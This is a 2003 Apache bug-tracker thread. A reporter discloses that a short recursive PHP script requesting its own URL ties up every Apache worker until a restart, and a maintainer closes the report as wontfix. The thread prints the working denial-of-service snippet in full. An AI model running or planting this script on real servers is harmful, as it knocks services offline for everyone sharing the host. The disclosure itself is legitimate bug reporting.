[{"count": 0, "tags": [], "creator": "apachebug@barendse.biz", "is_private": false, "text": "When running this php script Apache spawns 150 (MaxClients) processes, which\nwill all get the state sleep soon. They remain listed in the process list but\nthe server is not accepting new connections (because the MaxClients are\nreached). Restarting apache was the solution.\n\nPlatform freebsd 5.0 Apache 1.3.27 PHP 4.3.1 also tested on Linux debian.\n\ncode apachedos.php\n<?php\n\n\tfunction crash(){\n\t\tfopen(\"http://localhost/apachedos.php\",r);\n\t\tcrash();\n\t\treturn 0;\n\t}\n\tcrash();\n?>\nWith another recursive function i got the error\n\nhttpd in free(): warning: recursive call\nhttpd in malloc(): warning: recursive call\nFATAL:  emalloc():  Unable to allocate 64 bytes\n\nin httpd-error.log (which kills the process).\nthis is should happen here too.\n\nPS I don't know if this is a apache issue or php issue. \n\nThis dos requires access to the server, but in a shared environment like a\nhosting provider this is pretty common.", "id": 37415, "time": "2003-05-18T22:18:17Z", "bug_id": 20026, "creation_time": "2003-05-18T22:18:17Z", "attachment_id": null}, {"count": 1, "tags": [], "text": "I'm going to mark this as \"wontfix\" because it seems to me you could do pretty\nmuch the same thing with wget and a shell script.", "is_private": false, "id": 37726, "creator": "slive@apache.org", "time": "2003-05-24T17:09:17Z", "bug_id": 20026, "creation_time": "2003-05-24T17:09:17Z", "attachment_id": null}]